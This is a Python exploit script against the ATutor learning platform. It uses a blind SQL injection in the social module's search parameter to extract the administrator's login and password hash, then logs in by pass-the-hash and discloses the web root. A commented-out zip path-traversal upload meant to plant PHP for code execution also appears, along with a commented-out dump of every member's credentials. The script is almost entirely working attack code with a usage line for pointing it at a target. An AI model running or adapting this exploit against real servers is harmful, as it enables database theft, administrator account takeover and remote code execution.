import sys, requests, hashlib, zipfile, re

s = requests.Session()

def searchFriends(ip, injStr):
	for i in range(32, 126):
		target = "http://%s/atutor/mods/_standard/social/index_public.php?q=%s" % (ip, injStr.replace("[CHAR]", str(i)))
		r = requests.get(target)
		content_length = int(r.headers['Content-Length'])
		if(content_length > 20):
			return i
	return None


def count(column, ip):
	for i in range(1, 100):
		injectStr = "test')/**/or/**/(ascii(substring((select/**/count(%s)/**/from/**/AT_members),%d,1)))=[CHAR]%%23" % (column,i)
		try:
			counted = chr(searchFriends(ip, injectStr))
		except:
			break
	return int(counted)


def inject(inj, ip):
	output = ""
	for i in range(1, 100):
		injectStr = "test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23" % (inj,i)
		try:
			extractedChar = chr(searchFriends(ip, injectStr))
			sys.stdout.write(extractedChar)
			sys.stdout.flush()
			output = output + extractedChar
		except:
			break
	return output


def generateHash(passwd, token):
	m = hashlib.sha1()
	m.update(passwd.encode('utf-8') + token.encode('utf-8'))
	return m.hexdigest()

def login(ip, hash, user):
	target = "http://%s/atutor/login.php" % ip
	token = "xxx"
	hashed = generateHash(hash, token)
	d = {
		"form_password_hidden" : hashed,
		"form_login": "%s" % user,
		"submit" : "Login",
		"token" : token
	}

	output = dict()
	r = s.post(target, data=d)
	res = r.text
	if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
		usermatch = re.search(r'send_message.php\?id=1">(.*?)</a></small></td>', res)
		if usermatch:
			output = usermatch.group(1)
		return output
	return False


def fileUpload(ip):
	target = 'http://%s/atutor/users/browse.php?access=&search[]=a&include=all&filter=Filter' % ip
	res = s.get(target).text
	if "Warning" in res:
		webRoot = re.search(r'<b>/([^<]+)/atutor/include/html/browse\.inc\.php', res)
		if webRoot:
			print("[+] Web root found: ", webRoot.group(1))
	else:
		print("[!] Could not parse Web root.")

	'''z = zipfile.ZipFile("poc.zip", "w", zipfile.ZIP_DEFLATED)
	z.writestr('../../../../../../../../../../%s/atutor/XXX/info.php', '<?php phpinfo(); ?>') % webRoot
	z.writestr('imsmanifest.xml', 'not a valid xml structure')
	z.close()'''


def main():
	ip = sys.argv[1]

	if len(sys.argv) != 2:
		print("[!] Usage: python3 %s <target>" % sys.argv[0])
		print("ex: python3 %s 192.168.1.100" % sys.argv[0])
		sys.exit(-1)

	# Commented for better performance ;)
	'''print("\n[+] Database version")
	query = "select/**/version()"
	dbVersion = inject(query, ip)

    print("\n\n[+] Retrieving credentials...")
	usercount = count("login", ip)
	for i in range(0, usercount):
		query = "select/**/concat(login,0x3a,password)/**/from/**/AT_members/**/order/**/by/**/login/**/limit/**/1/**/offset/**/%d" % i
		username = inject(query, ip)
		print("")'''

	print("\n\n[+] Retrieving credentials from a privileged account...")
	query = "select/**/login/**/from/**/AT_members/**/where/**/status/**/=/**/3/**/limit/**/1"
	adminuser = inject(query, ip)
	print(":", end = '')
	query = "select/**/password/**/from/**/AT_members/**/where/**/status/**/=/**/3/**/limit/**/1"
	adminpass = inject(query, ip)
	you = login(ip, adminpass, adminuser)

	if you:
		print("\n\n[+] Login successful!")
		print("[+] Logged in as:", you)
	else:
		print("\n\n[!] Login failed.")

	rce = fileUpload(ip)

if __name__ == "__main__":
	main()
